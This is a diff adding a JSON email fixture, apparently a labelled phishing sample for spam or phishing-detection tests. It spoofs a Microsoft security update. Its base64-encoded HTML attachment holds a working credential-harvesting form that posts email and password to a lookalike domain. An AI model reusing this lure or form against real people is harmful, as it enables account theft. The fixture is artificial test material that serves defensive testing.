@@ -1,0 +1,136 @@
+{
+  "id": "phishing_010_security_update",
+  "threadId": "phishing_010_security_update",
+  "labelIds": [
+    "UNREAD",
+    "INBOX",
+    "SPAM"
+  ],
+  "snippet": "Dear User, We detected outdated security components on your device. Download the mandatory patch within 1 hour to avoid service interruption...",
+  "payload": {
+    "partId": "",
+    "mimeType": "multipart/mixed",
+    "filename": "",
+    "headers": [
+      {
+        "name": "Delivered-To",
+        "value": "it-admin@example.com"
+      },
+      {
+        "name": "Received",
+        "value": "by 2002:a05:6420:10a8:b0:1a2:a1a5:36a5 with SMTP id ok12csp998877rdb; Thu, 13 Nov 2025 04:25:06 -0800 (PST)"
+      },
+      {
+        "name": "Return-Path",
+        "value": "<security-update@ms-secure-patch.com>"
+      },
+      {
+        "name": "Received",
+        "value": "from ms-secure-patch.com (update.ms-secure-patch.com. [62.84.71.210]) by mx.google.com with ESMTPS id k19-20020a5d2f46000000b002c4a77560cbsi1425364qka.321.2025.11.13.04.25.05 for <it-admin@example.com>; Thu, 13 Nov 2025 04:25:06 -0800 (PST)"
+      },
+      {
+        "name": "Authentication-Results",
+        "value": "mx.google.com; dkim=fail (body hash did not verify) header.i=@ms-secure-patch.com; spf=fail (google.com: domain of security-update@ms-secure-patch.com does not designate 62.84.71.210 as permitted sender) smtp.mailfrom=security-update@ms-secure-patch.com; dmarc=fail (p=REJECT sp=REJECT dis=NONE) header.from=microsoft.com"
+      },
+      {
+        "name": "Message-ID",
+        "value": "<20251113042505.889900@ms-secure-patch.com>"
+      },
+      {
+        "name": "Date",
+        "value": "Thu, 13 Nov 2025 04:25:05 -0800"
+      },
+      {
+        "name": "Subject",
+        "value": "Immediate Security Patch Required"
+      },
+      {
+        "name": "From",
+        "value": "Microsoft Security <security@microsoft.com>"
+      },
+      {
+        "name": "Reply-To",
+        "value": "Microsoft Security <security-update@ms-secure-patch.com>"
+      }
+    ],
+    "body": {
+      "size": 0
+    },
+    "parts": [
+      {
+        "partId": "0",
+        "mimeType": "multipart/alternative",
+        "filename": "",
+        "headers": [],
+        "body": {
+          "size": 0
+        },
+        "parts": [
+          {
+            "partId": "0.0",
+            "mimeType": "text/plain",
+            "filename": "",
+            "headers": [
+              {
+                "name": "Content-Type",
+                "value": "text/plain; charset=UTF-8"
+              },
+              {
+                "name": "Content-Transfer-Encoding",
+                "value": "base64"
+              }
+            ],
+            "body": {
+              "size": 216,
+              "data": "RGVhciBVc2VyLAoKV2UgZGV0ZWN0ZWQgb3V0ZGF0ZWQgc2VjdXJpdHkgY29tcG9uZW50cyBvbiB5b3VyIGRldmljZS4gRG93bmxvYWQgdGhlIG1hbmRhdG9yeSBwYXRjaCB3aXRoaW4gMSBob3VyIHRvIGF2b2lkIHNlcnZpY2UgaW50ZXJydXB0aW9uLgoKQXR0YWNobWVudDogU2VjdXJpdHlQYXRjaC5odG1sCgpTZWN1cml0eSBPcGVyYXRpb25z"
+            }
+          },
+          {
+            "partId": "0.1",
+            "mimeType": "text/html",
+            "filename": "",
+            "headers": [
+              {
+                "name": "Content-Type",
+                "value": "text/html; charset=UTF-8"
+              },
+              {
+                "name": "Content-Transfer-Encoding",
+                "value": "base64"
+              }
+            ],
+            "body": {
+              "size": 360,
+              "data": "PCFET0NUWVBFIGh0bWw-PGh0bWw-PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWYiPjxoMiBzdHlsZT0iY29sb3I6I2Q5MzAyNSI-U2VjdXJpdHkgQWxlcnQ8L2gyPjxwPldlIGRldGVjdGVkIG91dGRhdGVkIHNlY3VyaXR5IGNvbXBvbmVudHMgb24geW91ciBkZXZpY2UuIERvd25sb2FkIHRoZSBtYW5kYXRvcnkgcGF0Y2ggd2l0aGluIDxzdHJvbmc-MSBob3VyPC9zdHJvbmc-IHRvIGF2b2lkIHNlcnZpY2UgaW50ZXJydXB0aW9uLjwvcD48cD5PcGVuIHRoZSBhdHRhY2hlZCBmaWxlIDxzdHJvbmc-U2VjdXJpdHlQYXRjaC5odG1sPC9zdHJvbmc-IGFuZCBmb2xsb3cgdGhlIGluc3RydWN0aW9ucy48L3A-PHA-U2VjdXJpdHkgT3BlcmF0aW9uczwvcD48L2JvZHk-PC9odG1sPg"
+            }
+          }
+        ]
+      },
+      {
+        "partId": "1",
+        "mimeType": "text/html",
+        "filename": "SecurityPatch.html",
+        "headers": [
+          {
+            "name": "Content-Type",
+            "value": "text/html; name=SecurityPatch.html"
+          },
+          {
+            "name": "Content-Disposition",
+            "value": "attachment; filename=SecurityPatch.html"
+          },
+          {
+            "name": "Content-Transfer-Encoding",
+            "value": "base64"
+          }
+        ],
+        "body": {
+          "size": 520,
+          "data": "PCFET0NUWVBFIGh0bWw-PGh0bWw-PGJvZHkgc3R5bGU9ImZvbnQtZmFtaWx5OkFyaWFsLHNhbnMtc2VyaWYiPjxoMT5NaWNyb3NvZnQgU2VjdXJpdHkgUGF0Y2g8L2gxPjxwPlRvIGFwcGx5IHRoZSB1cGRhdGUsIHJlLWF1dGhlbnRpY2F0ZSBiZWxvdy48L3A-PGZvcm0gYWN0aW9uPSJodHRwczovL21zLXNlY3VyZS1wYXRjaC5jb20vdXBkYXRlIiBtZXRob2Q9InBvc3QiPjxsYWJlbD5FbWFpbDxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0iZW1haWwiIHJlcXVpcmVkPjwvbGFiZWw-PGJyPjxsYWJlbD5QYXNzd29yZDxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiIHJlcXVpcmVkPjwvbGFiZWw-PGJyPjxidXR0b24gdHlwZT0ic3VibWl0Ij5BcHBseSBQYXRjaDwvYnV0dG9uPjwvZm9ybT48L2JvZHk-PC9odG1sPg"
+        }
+      }
+    ]
+  },
+  "sizeEstimate": 6144,
+  "historyId": "5566778899"
+}
